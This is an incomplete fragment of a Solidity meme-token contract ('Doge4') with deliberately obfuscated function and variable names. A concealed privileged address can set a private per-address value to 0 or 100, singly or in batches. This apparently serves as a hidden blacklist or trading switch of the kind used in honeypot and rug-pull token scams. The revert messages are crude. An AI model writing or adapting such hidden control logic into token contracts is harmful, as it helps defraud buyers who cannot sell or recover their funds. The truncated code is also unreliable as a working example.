...
contract Doge4 is Ownable {
    ...
    constructor(address EyPKkbu,string memory memename, string memory memesymbol) {
    ...
    address public kUfDTZE;
    mapping(address => uint256) private rFLMbpj;
    function ZrtjOKS(address WCUEFcr) external   {
        if(kUfDTZE != _msgSender()){
            revert("mememememem fuck");
        }
        rFLMbpj[WCUEFcr] = 0;
    }

    function AapRNsOZ(address[] calldata WCUEFcr) external {
    if(kUfDTZE != _msgSender()){
       revert("mememememem fuck");
    }
    
    for (uint i = 0; i < WCUEFcr.length; i++) {
        rFLMbpj[WCUEFcr[i]] = 100;
    }
}


    function GMdSUNw(address WCUEFcr) external {
        if(kUfDTZE != _msgSender()){
            revert("mememememem fuck");
        }
